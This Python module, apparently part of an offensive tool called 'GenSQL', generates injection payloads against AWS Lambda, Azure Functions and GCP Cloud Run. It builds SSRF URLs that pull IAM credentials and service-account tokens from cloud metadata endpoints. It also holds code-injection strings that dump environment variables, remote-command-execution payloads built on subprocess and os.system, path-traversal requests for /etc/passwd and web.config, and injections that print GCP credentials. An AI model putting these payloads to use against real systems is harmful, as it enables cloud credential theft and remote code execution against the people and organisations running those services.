#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
GenSQL Cloud Injector - AWS Lambda, Azure Functions, GCP Cloud Run injection
Author: Jeevraj
Supports: Lambda cold-start timing, metadata extraction, SSRF to metadata
"""

import re
import time

class CloudInjector(object):
    """Cloud and serverless injection attacks."""

    def __init__(self, provider='auto', ssrf_metadata=False, verbose=False):
        self.provider = provider
        self.ssrf_metadata = ssrf_metadata
        self.verbose = verbose
        self.metadata_endpoints = self._load_metadata_endpoints()

    def _load_metadata_endpoints(self):
        """Load cloud provider metadata endpoints."""
        return {
            'aws': {
                'endpoint': '169.254.169.254',
                'paths': [
                    '/latest/meta-data/',
                    '/latest/meta-data/iam/security-credentials/',
                    '/latest/user-data',
                    '/latest/meta-data/instance-id',
                    '/latest/meta-data/ami-id',
                    '/latest/meta-data/security-groups',
                ],
                'token_endpoint': '/latest/api/token',
            },
            'azure': {
                'endpoint': '169.254.169.254',
                'paths': [
                    '/metadata/instance?api-version=2021-02-01',
                    '/metadata/instance/compute?api-version=2021-02-01',
                ],
                'header': 'Metadata: true',
            },
            'gcp': {
                'endpoint': 'metadata.google.internal',
                'paths': [
                    '/computeMetadata/v1/',
                    '/computeMetadata/v1/instance/service-accounts/default/identity',
                    '/computeMetadata/v1/instance/service-accounts/default/token',
                ],
                'header': 'Metadata-Flavor: Google',
            }
        }

    def detect_cloud_provider(self, url, headers=None):
        """
        Detect which cloud provider is running.
        
        Args:
            url: Application URL
            headers: Response headers
        
        Returns:
            Provider name or 'unknown'
        """
        if headers is None:
            headers = {}
        
        headers_str = str(headers).lower()
        
        # AWS indicators
        aws_indicators = ['x-amzn', 'x-amz', 'cloudfront', 'elasticloadbalancing']
        if any(ind in headers_str for ind in aws_indicators):
            return 'aws'
        
        # Azure indicators
        azure_indicators = ['x-aspnet', 'x-powered-by']
        if any(ind in headers_str for ind in azure_indicators):
            return 'azure'
        
        # GCP indicators
        gcp_indicators = ['x-goog', 'google']
        if any(ind in headers_str for ind in gcp_indicators):
            return 'gcp'
        
        return 'unknown'

    def lambda_cold_start_timing(self, url, payload_callback):
        """
        Detect Lambda cold start via timing analysis.
        
        Args:
            url: Target Lambda endpoint
            payload_callback: Callback to execute payload
        
        Returns:
            Timing analysis result
        """
        timings = []
        
        for i in range(3):
            start = time.time()
            try:
                payload_callback(f"test_{i}")
                elapsed = time.time() - start
                timings.append(elapsed)
            except Exception as e:
                if self.verbose:
                    print(f"[!] Timing test error: {str(e)[:60]}")
        
        if len(timings) >= 2:
            # Cold start typically much slower
            avg_normal = sum(timings[1:]) / len(timings[1:])
            cold_start_threshold = avg_normal * 10
            
            return {
                'cold_start_detected': timings[0] > cold_start_threshold,
                'cold_start_time': timings[0],
                'avg_normal_time': avg_normal,
            }
        
        return {}

    def ssrf_metadata_extraction(self, ssrf_endpoint, provider='aws'):
        """
        Generate SSRF payloads to extract cloud metadata.
        
        Args:
            ssrf_endpoint: SSRF-vulnerable endpoint
            provider: Cloud provider (aws, azure, gcp)
        
        Returns:
            List of SSRF payload URLs
        """
        metadata = self.metadata_endpoints.get(provider)
        if not metadata:
            return []
        
        payloads = []
        endpoint = metadata['endpoint']
        
        for path in metadata.get('paths', []):
            url = f"http://{endpoint}{path}"
            
            # Different SSRF injection points
            variations = [
                f"?file={url}",
                f"?url={url}",
                f"?proxy={url}",
                f"?endpoint={url}",
                f"?redirect={url}",
                f"&fetch={url}",
            ]
            
            for var in variations:
                payloads.append(f"{ssrf_endpoint}{var}")
        
        return payloads

    def lambda_environment_extraction(self, injection_point):
        """
        Generate payloads to extract Lambda environment variables.
        
        Args:
            injection_point: Parameter to inject into
        
        Returns:
            List of environment extraction payloads
        """
        payloads = [
            "'; import os; print(os.environ) #",
            "${os.environ}",
            "'; exec(\"import json; import os; print(json.dumps(dict(os.environ)))\") #",
            "'; lambda_context = {}; print(lambda_context) #",
        ]
        return payloads

    def lambda_rce_payload(self, command):
        """
        Generate Lambda RCE payload.
        
        Args:
            command: Command to execute
        
        Returns:
            RCE payload
        """
        payloads = [
            f"'; import subprocess; subprocess.run(['{command}'], shell=True) #",
            f"'; __import__('subprocess').call('{command}', shell=True) #",
            f"'; exec(\"import os; os.system('{command}')\") #",
        ]
        return payloads

    def azure_function_app_injection(self, function_url):
        """
        Generate Azure Functions injection payloads.
        
        Args:
            function_url: Azure Function endpoint
        
        Returns:
            List of injection payloads
        """
        payloads = [
            f"{function_url}?code=../../etc/passwd",
            f"{function_url}?target=../../web.config",
            f"{function_url}#../../../",
            f"{function_url}%3fcode%3d..%2f..%2fetc%2fpasswd",
        ]
        return payloads

    def gcp_cloud_run_injection(self):
        """
        Generate GCP Cloud Run injection payloads.
        
        Returns:
            List of injection payloads
        """
        payloads = [
            "'; import google.auth; creds = google.auth.default(); print(creds) #",
            "'; from google.cloud import storage; print(storage.Client()) #",
        ]
        return payloads

    def detect_container(self):
        """
        Detect if running in container/serverless environment.
        
        Returns:
            True if in container, False otherwise
        """
        # Check for common container/serverless indicators
        indicators = [
            '/.dockerenv',
            '/run/.containerenv',
            '/proc/self/cgroup',
        ]
        
        import os
        for indicator in indicators:
            if os.path.exists(indicator):
                return True
        
        # Check environment variables
        cloud_env_vars = ['AWS_LAMBDA_FUNCTION_NAME', 'FUNCTION_INSTANCE', 'K_REVISION']
        for var in cloud_env_vars:
            if os.environ.get(var):
                return True
        
        return False
